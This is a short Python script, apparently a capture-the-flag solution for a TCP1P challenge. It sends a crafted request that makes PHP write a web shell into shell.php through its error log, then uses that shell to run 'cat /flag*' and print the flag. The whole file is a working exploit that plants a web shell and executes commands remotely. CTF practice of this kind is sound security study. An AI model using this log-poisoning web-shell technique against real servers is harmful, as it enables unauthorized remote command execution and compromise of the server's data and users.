import requests
import re

url = "http://target/"

exploit = "?display_errors=1&error_log=/var/www/html/shell.php&name=<?=+system($_GET['cmd']);?>"

r = requests.get(url + exploit)

r = requests.get(url + "shell.php?cmd=cat /flag*")

print(re.findall(r"TCP1P{.*}", r.text)[0])